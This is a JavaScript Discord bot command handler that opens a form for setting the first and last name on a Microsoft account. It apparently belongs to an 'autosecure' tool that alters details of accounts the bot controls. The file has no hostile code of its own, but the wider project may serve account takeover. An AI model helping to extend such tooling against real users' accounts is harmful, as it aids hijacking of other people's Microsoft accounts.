const generate = require("../../../autosecure/utils/generate");
const { queryParams } = require("../../../db/database");
const modalBuilder = require("../../../autosecure/utils/utils/modalBuilder");
const { TextInputStyle } = require('discord.js');

module.exports = {
    name: "changenameautosecure",
        editautosecure: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|");
        let actionId = generate(32);
        await queryParams(
            `INSERT INTO actions (id, action) VALUES (?, ?)`,
            [actionId, `modalchangename|${botnumber}|${ownerid}`]
        );

        let customModalId = `action|${actionId}`

                interaction.showModal(modalBuilder(
                    customModalId,
                    `Change First and Last Name (leave empty)`,
                    [
                        {
                            setCustomId: 'firstname',
                            setRequired: false,
                            setLabel: 'First Name',
                            setPlaceholder: 'Enter first name for Microsoft to be set.',
                            setMaxLength: 32,
                            setStyle: TextInputStyle.Short
                        },
                        {
                            setCustomId: 'lastname',
                            setRequired: false,
                            setLabel: 'Last Name',
                            setPlaceholder: 'Enter last name for Microsoft to be set.',
                            setMaxLength: 32,
                            setStyle: TextInputStyle.Short
                        }
                    ]
                ));

    }
}